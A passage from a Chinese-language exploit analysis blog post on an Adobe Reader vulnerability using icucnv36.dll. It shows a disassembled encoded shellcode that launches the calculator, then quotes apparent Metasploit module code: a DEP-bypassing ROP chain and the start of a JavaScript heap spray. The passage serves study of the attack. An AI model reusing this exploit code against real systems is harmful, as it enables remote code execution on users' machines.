<p>可以看到这次调用了 <code>CreateFileMappingA</code> 函数，之后用相同的方法执行 <code>MapViewOfFile</code> 函数完成一段可执行内存空间的开辟。之后调用 <code>memcpy</code> 函数完成堆上 <code>shellcode</code> 的复制。查看 <code>shellcode</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">029e0000</span> b8640f9c97      mov     eax,<span class="number">979</span>C0F64h</span><br><span class="line"><span class="number">029e0005</span> dacc            fcmove  st,st(<span class="number">4</span>)</span><br><span class="line"><span class="number">029e0007</span> d97424f4        fnstenv [esp<span class="number">-0</span>Ch]</span><br><span class="line"><span class="number">029e000</span>b <span class="number">5</span>e              pop     esi</span><br><span class="line"><span class="number">029e000</span>c <span class="number">29</span>c9            sub     ecx,ecx</span><br><span class="line"><span class="number">029e000</span>e b131            mov     cl,<span class="number">31</span>h</span><br><span class="line"><span class="number">029e0010</span> <span class="number">83</span>c604          add     esi,<span class="number">4</span></span><br><span class="line"><span class="number">029e0013</span> <span class="number">31460f</span>          xor     dword ptr [esi+<span class="number">0F</span>h],eax</span><br><span class="line"><span class="number">029e0016</span> <span class="number">03460f</span>          add     eax,dword ptr [esi+<span class="number">0F</span>h]</span><br><span class="line"><span class="number">029e0019</span> e2f5            loop    <span class="number">029e0010</span></span><br><span class="line"><span class="number">029e001</span>b fc              cld</span><br><span class="line"><span class="number">029e001</span>c e882000000      call    <span class="number">029e00</span>a3</span><br><span class="line"><span class="number">029e0021</span> <span class="number">60</span>              pushad</span><br><span class="line"><span class="number">029e0022</span> <span class="number">89e5</span>            mov     ebp,esp</span><br><span class="line"><span class="number">029e0024</span> <span class="number">31</span>c0            xor     eax,eax</span><br><span class="line"><span class="number">029e0026</span> <span class="number">648b</span>5030        mov     edx,dword ptr fs:[eax+<span class="number">30</span>h]</span><br><span class="line"><span class="number">029e002</span>a <span class="number">8b</span>520c          mov     edx,dword ptr [edx+<span class="number">0</span>Ch]</span><br><span class="line"><span class="number">029e002</span>d <span class="number">8b</span>5214          mov     edx,dword ptr [edx+<span class="number">14</span>h]</span><br><span class="line"><span class="number">029e0030</span> <span class="number">8b</span>7228          mov     esi,dword ptr [edx+<span class="number">28</span>h]</span><br><span class="line"><span class="number">029e0033</span> <span class="number">0f</span>b74a26        movzx   ecx,word ptr [edx+<span class="number">26</span>h]</span><br><span class="line"><span class="number">029e0037</span> <span class="number">31f</span>f            xor     edi,edi</span><br><span class="line"><span class="number">029e0039</span> ac              lods    byte ptr [esi]</span><br><span class="line"><span class="number">029e003</span>a <span class="number">3</span>c61            cmp     al,<span class="number">61</span>h</span><br><span class="line"><span class="number">029e003</span>c <span class="number">7</span>c02            jl      <span class="number">029e0040</span></span><br><span class="line"><span class="number">029e003</span>e <span class="number">2</span>c20            sub     al,<span class="number">20</span>h</span><br><span class="line"><span class="number">029e0040</span> c1cf0d          ror     edi,<span class="number">0</span>Dh</span><br><span class="line"><span class="number">029e0043</span> <span class="number">01</span>c7            add     edi,eax</span><br><span class="line"><span class="number">029e0045</span> e2f2            loop    <span class="number">029e0039</span></span><br><span class="line"><span class="number">029e0047</span> <span class="number">52</span>              push    edx</span><br><span class="line"><span class="number">029e0048</span> <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">029e0049</span> <span class="number">8b</span>5210          mov     edx,dword ptr [edx+<span class="number">10</span>h]</span><br><span class="line"><span class="number">029e004</span>c <span class="number">8b</span>4a3c          mov     ecx,dword ptr [edx+<span class="number">3</span>Ch]</span><br><span class="line"><span class="number">029e004</span>f <span class="number">8b</span>4c1178        mov     ecx,dword ptr [ecx+edx+<span class="number">78</span>h]</span><br><span class="line"><span class="number">029e0053</span> e348            jecxz   <span class="number">029e009</span>d</span><br><span class="line"><span class="number">029e0055</span> <span class="number">01</span>d1            add     ecx,edx</span><br><span class="line"><span class="number">029e0057</span> <span class="number">51</span>              push    ecx</span><br><span class="line"><span class="number">029e0058</span> <span class="number">8b</span>5920          mov     ebx,dword ptr [ecx+<span class="number">20</span>h]</span><br><span class="line"><span class="number">029e005</span>b <span class="number">01</span>d3            add     ebx,edx</span><br><span class="line"><span class="number">029e005</span>d <span class="number">8b</span>4918          mov     ecx,dword ptr [ecx+<span class="number">18</span>h]</span><br><span class="line"><span class="number">029e0060</span> e33a            jecxz   <span class="number">029e009</span>c</span><br><span class="line"><span class="number">029e0062</span> <span class="number">49</span>              dec     ecx</span><br><span class="line"><span class="number">029e0063</span> <span class="number">8b</span>348b          mov     esi,dword ptr [ebx+ecx*<span class="number">4</span>]</span><br><span class="line"><span class="number">029e0066</span> <span class="number">01</span>d6            add     esi,edx</span><br><span class="line"><span class="number">029e0068</span> <span class="number">31f</span>f            xor     edi,edi</span><br><span class="line"><span class="number">029e006</span>a ac              lods    byte ptr [esi]</span><br><span class="line"><span class="number">029e006</span>b c1cf0d          ror     edi,<span class="number">0</span>Dh</span><br><span class="line"><span class="number">029e006</span>e <span class="number">01</span>c7            add     edi,eax</span><br><span class="line"><span class="number">029e0070</span> <span class="number">38e0</span>            cmp     al,ah</span><br><span class="line"><span class="number">029e0072</span> <span class="number">75f</span>6            jne     <span class="number">029e006</span>a</span><br><span class="line"><span class="number">029e0074</span> <span class="number">037</span>df8          add     edi,dword ptr [ebp<span class="number">-8</span>]</span><br><span class="line"><span class="number">029e0077</span> <span class="number">3b</span>7d24          cmp     edi,dword ptr [ebp+<span class="number">24</span>h]</span><br><span class="line"><span class="number">029e007</span>a <span class="number">75e4</span>            jne     <span class="number">029e0060</span></span><br><span class="line"><span class="number">029e007</span>c <span class="number">58</span>              pop     eax</span><br><span class="line"><span class="number">029e007</span>d <span class="number">8b</span>5824          mov     ebx,dword ptr [eax+<span class="number">24</span>h]</span><br><span class="line"><span class="number">029e0080</span> <span class="number">01</span>d3            add     ebx,edx</span><br><span class="line"><span class="number">029e0082</span> <span class="number">668b</span>0c4b        mov     cx,word ptr [ebx+ecx*<span class="number">2</span>]</span><br><span class="line"><span class="number">029e0086</span> <span class="number">8b</span>581c          mov     ebx,dword ptr [eax+<span class="number">1</span>Ch]</span><br><span class="line"><span class="number">029e0089</span> <span class="number">01</span>d3            add     ebx,edx</span><br><span class="line"><span class="number">029e008</span>b <span class="number">8b</span>048b          mov     eax,dword ptr [ebx+ecx*<span class="number">4</span>]</span><br><span class="line"><span class="number">029e008</span>e <span class="number">01</span>d0            add     eax,edx</span><br><span class="line"><span class="number">029e0090</span> <span class="number">89442424</span>        mov     dword ptr [esp+<span class="number">24</span>h],eax</span><br><span class="line"><span class="number">029e0094</span> <span class="number">5b</span>              pop     ebx</span><br><span class="line"><span class="number">029e0095</span> <span class="number">5b</span>              pop     ebx</span><br><span class="line"><span class="number">029e0096</span> <span class="number">61</span>              popad</span><br><span class="line"><span class="number">029e0097</span> <span class="number">59</span>              pop     ecx</span><br><span class="line"><span class="number">029e0098</span> <span class="number">5</span>a              pop     edx</span><br><span class="line"><span class="number">029e0099</span> <span class="number">51</span>              push    ecx</span><br><span class="line"><span class="number">029e009</span>a ffe0            jmp     eax</span><br><span class="line"><span class="number">029e009</span>c <span class="number">5f</span>              pop     edi</span><br><span class="line"><span class="number">029e009</span>d <span class="number">5f</span>              pop     edi</span><br><span class="line"><span class="number">029e009</span>e <span class="number">5</span>a              pop     edx</span><br><span class="line"><span class="number">029e009</span>f <span class="number">8b</span>12            mov     edx,dword ptr [edx]</span><br><span class="line"><span class="number">029e00</span>a1 eb8d            jmp     <span class="number">029e0030</span></span><br><span class="line"><span class="number">029e00</span>a3 <span class="number">5</span>d              pop     ebp</span><br><span class="line"><span class="number">029e00</span>a4 <span class="number">6</span>a01            push    <span class="number">1</span></span><br><span class="line"><span class="number">029e00</span>a6 <span class="number">8</span>d85b2000000    lea     eax,[ebp+<span class="number">0B</span>2h]</span><br><span class="line"><span class="number">029e00</span>ac <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">029e00</span>ad <span class="number">68318b</span>6f87      push    <span class="number">876F</span>8B31h</span><br><span class="line"><span class="number">029e00</span>b2 ffd5            call    ebp</span><br><span class="line"><span class="number">029e00</span>b4 bbf0b5a256      mov     ebx,<span class="number">56</span>A2B5F0h</span><br><span class="line"><span class="number">029e00</span>b9 <span class="number">68</span>a695bd9d      push    <span class="number">9</span>DBD95A6h</span><br><span class="line"><span class="number">029e00</span>be ffd5            call    ebp</span><br><span class="line"><span class="number">029e00</span>c0 <span class="number">3</span>c06            cmp     al,<span class="number">6</span></span><br><span class="line"><span class="number">029e00</span>c2 <span class="number">7</span>c0a            jl      <span class="number">029e00</span>ce</span><br><span class="line"><span class="number">029e00</span>c4 <span class="number">80f</span>be0          cmp     bl,<span class="number">0E0</span>h</span><br><span class="line"><span class="number">029e00</span>c7 <span class="number">7505</span>            jne     <span class="number">029e00</span>ce</span><br><span class="line"><span class="number">029e00</span>c9 bb4713726f      mov     ebx,<span class="number">6F</span>721347h</span><br><span class="line"><span class="number">029e00</span>ce <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">029e00</span>d0 <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">029e00</span>d1 ffd5            call    ebp</span><br><span class="line"><span class="number">029e00</span>d3 <span class="number">63616</span>c          arpl    word ptr [ecx+<span class="number">6</span>Ch],sp</span><br><span class="line"><span class="number">029e00</span>d6 <span class="number">632</span>e            arpl    word ptr [esi],bp</span><br><span class="line"><span class="number">029e00</span>d8 <span class="number">657865</span>          js      <span class="number">029e0140</span></span><br><span class="line"><span class="number">029e00</span>db <span class="number">000</span>c0c          add     byte ptr [esp+ecx],cl</span><br></pre></td></tr></table></figure></p>
<p>一个被变形过的 <code>shellcode</code>,很难看出来功能，在<code>kernel32!WinExec</code>处下断点可以发现功能是弹出计算器。可能是我太菜了，算了，就这样吧。</p>
<h2 id="exploit分析"><a href="#exploit分析" class="headerlink" title="exploit分析"></a>exploit分析</h2><p>先贴一下主要的代码<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">make_js</span><span class="params">(encoded_payload)</span></span></span><br><span class="line"></span><br><span class="line">		<span class="comment"># The following executes a ret2lib using icucnv36.dll</span></span><br><span class="line">		<span class="comment"># The effect is to bypass DEP and execute the shellcode in an indirect way</span></span><br><span class="line">		stack_data = [</span><br><span class="line">			<span class="number">0x41414141</span>,   <span class="comment"># unused</span></span><br><span class="line">			<span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">			<span class="number">0x4a8a0000</span>,   <span class="comment"># becomes ecx</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret # save whatever eax starts as</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">			<span class="number">0x4a84903c</span>,   <span class="comment"># becomes eax (import for CreateFileA)</span></span><br><span class="line"></span><br><span class="line">			<span class="comment"># -- call CreateFileA</span></span><br><span class="line">			<span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a801064</span>,   <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a8522c8</span>,   <span class="comment"># first arg to CreateFileA (lpFileName / pointer to "iso88591")</span></span><br><span class="line">			<span class="number">0x10000000</span>,   <span class="comment"># second arg  - dwDesiredAccess</span></span><br><span class="line">			<span class="number">0x00000000</span>,   <span class="comment"># third arg   - dwShareMode</span></span><br><span class="line">			<span class="number">0x00000000</span>,   <span class="comment"># fourth arg  - lpSecurityAttributes</span></span><br><span class="line">			<span class="number">0x00000002</span>,   <span class="comment"># fifth arg   - dwCreationDisposition</span></span><br><span class="line">			<span class="number">0x00000102</span>,   <span class="comment"># sixth arg   - dwFlagsAndAttributes</span></span><br><span class="line">			<span class="number">0x00000000</span>,   <span class="comment"># seventh arg - hTemplateFile</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">			<span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">			<span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">			<span class="comment">#</span></span><br><span class="line">			<span class="comment"># This points at a neat-o block of code that ... TBD</span></span><br><span class="line">			<span class="comment">#</span></span><br><span class="line">			<span class="comment">#   and [esp+ebx*2],edi</span></span><br><span class="line">			<span class="comment">#   jne check_slash</span></span><br><span class="line">			<span class="comment"># ret_one:</span></span><br><span class="line">			<span class="comment">#   mov al,1</span></span><br><span class="line">			<span class="comment">#   ret</span></span><br><span class="line">			<span class="comment"># check_slash:</span></span><br><span class="line">			<span class="comment">#   cmp al,0x2f</span></span><br><span class="line">			<span class="comment">#   je ret_one</span></span><br><span class="line">			<span class="comment">#   cmp al,0x41</span></span><br><span class="line">			<span class="comment">#   jl check_lower</span></span><br><span class="line">			<span class="comment">#   cmp al,0x5a</span></span><br><span class="line">			<span class="comment">#   jle check_ptr</span></span><br><span class="line">			<span class="comment"># check_lower:</span></span><br><span class="line">			<span class="comment">#   cmp al,0x61</span></span><br><span class="line">			<span class="comment">#   jl ret_zero</span></span><br><span class="line">			<span class="comment">#   cmp al,0x7a</span></span><br><span class="line">			<span class="comment">#   jg ret_zero</span></span><br><span class="line">			<span class="comment">#   cmp [ecx+1],0x3a</span></span><br><span class="line">			<span class="comment">#   je ret_one</span></span><br><span class="line">			<span class="comment"># ret_zero:</span></span><br><span class="line">			<span class="comment">#   xor al,al</span></span><br><span class="line">			<span class="comment">#   ret</span></span><br><span class="line">			<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">			<span class="number">0x4a849038</span>,   <span class="comment"># becomes eax (import for CreateFileMappingA)</span></span><br><span class="line"></span><br><span class="line">			<span class="comment"># -- call CreateFileMappingA</span></span><br><span class="line">			<span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a801064</span>,   <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0xffffffff</span>,   <span class="comment"># arguments to CreateFileMappingA, hFile</span></span><br><span class="line">			<span class="number">0x00000000</span>,   <span class="comment"># lpAttributes</span></span><br><span class="line">			<span class="number">0x00000040</span>,   <span class="comment"># flProtect</span></span><br><span class="line">			<span class="number">0x00000000</span>,   <span class="comment"># dwMaximumSizeHigh</span></span><br><span class="line">			<span class="number">0x00010000</span>,   <span class="comment"># dwMaximumSizeLow</span></span><br><span class="line">			<span class="number">0x00000000</span>,   <span class="comment"># lpName</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">			<span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">			<span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">			<span class="number">0x4a849030</span>,   <span class="comment"># becomes eax (import for MapViewOfFile</span></span><br><span class="line"></span><br><span class="line">			<span class="comment"># -- call MapViewOfFile</span></span><br><span class="line">			<span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a801064</span>,   <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0xffffffff</span>,   <span class="comment"># args to MapViewOfFile - hFileMappingObject</span></span><br><span class="line">			<span class="number">0x00000022</span>,   <span class="comment"># dwDesiredAccess</span></span><br><span class="line">			<span class="number">0x00000000</span>,   <span class="comment"># dwFileOffsetHigh</span></span><br><span class="line">			<span class="number">0x00000000</span>,   <span class="comment"># dwFileOffsetLow</span></span><br><span class="line">			<span class="number">0x00010000</span>,   <span class="comment"># dwNumberOfBytesToMap</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">			<span class="number">0x4a8a0004</span>,   <span class="comment"># becomes ecx - writable pointer</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret - save map base addr</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">			<span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">			<span class="number">0x00000030</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">			<span class="number">0x4a8a0004</span>,   <span class="comment"># becomes eax - saved file mapping ptr</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a80a7d8</span>,   <span class="comment"># mov eax,[eax] / ret - load saved mapping ptr</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">			<span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">			<span class="number">0x00000020</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">			<span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a80aedc</span>,   <span class="comment"># lea edx,[esp+0xc] / push edx / push eax / push [esp+0xc] / push [0x4a8a093c] / call ecx / add esp, 0x10 / ret</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">			<span class="number">0x00000034</span>,   <span class="comment"># becomes eax</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a80d585</span>,   <span class="comment"># add eax,edx / ret</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">			<span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">			<span class="number">0x0000000a</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">			<span class="number">0x4a849170</span>,   <span class="comment"># becomes eax (import for memcpy)</span></span><br><span class="line"></span><br><span class="line">			<span class="comment"># -- call memcpy</span></span><br><span class="line">			<span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line"></span><br><span class="line">			<span class="number">0xffffffff</span>,   <span class="comment"># this stuff gets overwritten by the block at 0x4a80aedc, becomes ret from memcpy</span></span><br><span class="line">			<span class="number">0xffffffff</span>,   <span class="comment"># becomes first arg to memcpy (dst)</span></span><br><span class="line">			<span class="number">0xffffffff</span>,   <span class="comment"># becomes second arg to memcpy (src)</span></span><br><span class="line">			<span class="number">0x00001000</span>,   <span class="comment"># becomes third arg to memcpy (length)</span></span><br><span class="line">			<span class="comment">#0x0000258b,   # ??</span></span><br><span class="line">			<span class="comment">#0x4d4d4a8a,   # ??</span></span><br><span class="line">		].pack(<span class="string">'V*'</span>)</span><br><span class="line"></span><br><span class="line">		var_unescape  = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">		var_shellcode = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">		var_start     = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">		var_s         = <span class="number">0x10000</span></span><br><span class="line">		var_c         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">		var_b         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">		var_d         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">		var_3         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">		var_i         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">		var_4         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">		payload_buf = <span class="string">''</span></span><br><span class="line">		payload_buf &lt;&lt; stack_data</span><br><span class="line">		payload_buf &lt;&lt; encoded_payload</span><br><span class="line"></span><br><span class="line">		escaped_payload = Rex::Text.to_unescape(payload_buf)</span><br><span class="line"></span><br><span class="line">		js = <span class="string">%Q|</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_unescape&#125;</span> = unescape;</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_shellcode&#125;</span> = <span class="subst">#&#123;var_unescape&#125;</span>( '<span class="subst">#&#123;escaped_payload&#125;</span>' );</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_c&#125;</span> = <span class="subst">#&#123;var_unescape&#125;</span>( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );</span></span><br><span class="line"><span class="string">while (<span 